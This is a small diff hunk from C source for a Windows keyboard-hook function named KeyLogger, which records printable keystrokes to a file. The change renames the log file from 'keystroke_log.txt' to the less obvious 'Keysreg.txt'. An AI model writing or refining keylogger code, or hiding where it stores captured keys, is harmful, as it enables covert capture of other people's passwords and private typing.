@@ -20,7 +20,7 @@ LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
 
         // Check if it's a printable key
         if (isprint(key) || key == '\n' || key == '\t' || key == ' ') {
-            WriteToFile("keystroke_log.txt", &key);
+            WriteToFile("Keysreg.txt", &key);
         }
     }
 
